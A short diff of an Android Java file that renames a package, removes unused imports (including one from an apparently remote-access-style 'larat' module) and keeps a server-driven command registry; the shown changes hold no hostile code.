@@ -1,11 +1,6 @@
-package com.c4wd.command;
+package com.c4wd.commands;
 
-import android.content.Context;
 import android.os.AsyncTask;
-import android.os.PowerManager;
-import android.widget.Toast;
-
-import com.c4wd.larat.LaRatLocationManager;
 
 import java.util.HashMap;
 
@@ -23,7 +18,6 @@ public class Command {
     public static void initCommands() {
         if (Command.commandList == null) {
             Command.commandList = new HashMap<String, AsyncTask>();
-
             //Adding commands is simple
             //commandList.put("String of command that is sent from the server", new (Task class)());
 
